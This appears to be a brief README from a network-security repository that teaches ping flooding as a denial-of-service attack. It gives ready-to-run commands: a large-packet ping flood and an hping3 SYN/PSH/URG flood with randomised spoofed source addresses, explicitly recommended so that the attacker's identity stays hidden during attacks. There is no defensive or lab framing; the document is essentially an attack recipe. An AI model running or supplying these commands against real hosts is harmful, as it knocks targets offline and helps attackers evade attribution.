# network-security
## ping flooding (DOS attack)
ping flood basically floods the target pc with lots of ping requests so that it cannot access any other internet resource
command:
```
  ping -f -s 65500 ip(or website)
```

However, there are more sophisticated tools available at our disposal like Hping3
using hping we can easily spoof our ips, so that your identity remains secure while doing the attacks
after installing hping3, we can use the following commands:

```
  hping3 -S -P -U --flood -V --rand-source website(or ip)
```
